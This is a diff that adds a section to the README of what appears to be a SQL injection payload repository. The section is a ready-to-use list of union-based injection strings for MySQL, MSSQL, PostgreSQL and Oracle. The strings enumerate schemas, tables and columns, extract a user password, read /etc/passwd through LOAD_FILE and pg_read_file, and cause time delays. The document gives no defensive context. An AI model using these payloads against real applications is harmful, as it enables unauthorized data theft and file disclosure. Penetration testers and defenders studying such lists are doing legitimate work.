@@ -75,5 +75,60 @@ This repository contains payloads for different types of SQL injection attacks:
 
 ---
 
+# Union-Based SQL Injection Payloads
+
+## 📋 Union-Based SQLi Payloads
+
+### MySQL
+- `' UNION SELECT 1,2,3--`
+- `' UNION SELECT NULL,NULL,NULL--`
+- `' UNION SELECT 1,2,3,4,5,6,7--`
+- `' UNION SELECT database(),user(),version()--`
+- `' UNION SELECT table_name FROM information_schema.tables--`
+- `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
+- `' UNION SELECT @@datadir,@@hostname,@@port--`
+- `' UNION SELECT 1,CONCAT(user(),0x3a,database()),3,4--`
+- `' UNION SELECT LOAD_FILE('/etc/passwd')--`
+- `' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--`
+
+### MSSQL
+- `' UNION SELECT NULL,NULL,NULL--`
+- `' UNION SELECT @@version,db_name(),system_user--`
+- `' UNION SELECT table_name FROM information_schema.tables--`
+- `' UNION SELECT name FROM sysobjects WHERE xtype='U'--`
+- `' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')--`
+- `' UNION SELECT top 1 name FROM sys.tables--`
+- `' UNION SELECT host_name(),original_login(),session_user--`
+- `' UNION SELECT 1,2,3,4,5,6--`
+- `' UNION SELECT CAST((SELECT password FROM dbo.users WHERE id=1) AS VARCHAR)--`
+- `' UNION SELECT name FROM master.dbo.sysdatabases--`
+
+### PostgreSQL
+- `' UNION SELECT version(),current_database(),current_user--`
+- `' UNION SELECT NULL,NULL,NULL--`
+- `' UNION SELECT table_name FROM information_schema.tables--`
+- `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
+- `' UNION SELECT pg_sleep(10)--`
+- `' UNION SELECT pg_read_file('/etc/passwd',0,100)--`
+- `' UNION SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'--`
+- `' UNION SELECT 1,2,3,4,5,6--`
+- `' UNION SELECT pg_database_size('postgres')--`
+- `' UNION SELECT pg_table_size('users')--`
+
+### Oracle
+- `' UNION SELECT banner FROM v$version--`
+- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
+- `' UNION SELECT sysdate FROM dual--`
+- `' UNION SELECT username FROM all_users--`
+- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
+- `' UNION SELECT banner FROM v$version WHERE ROWNUM=1--`
+- `' UNION SELECT user FROM dual--`
+- `' UNION SELECT name FROM v$database--`
+- `' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--`
+- `' UNION SELECT (SELECT listagg(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='USERS') FROM dual--`
+
+
+---
+
 
 
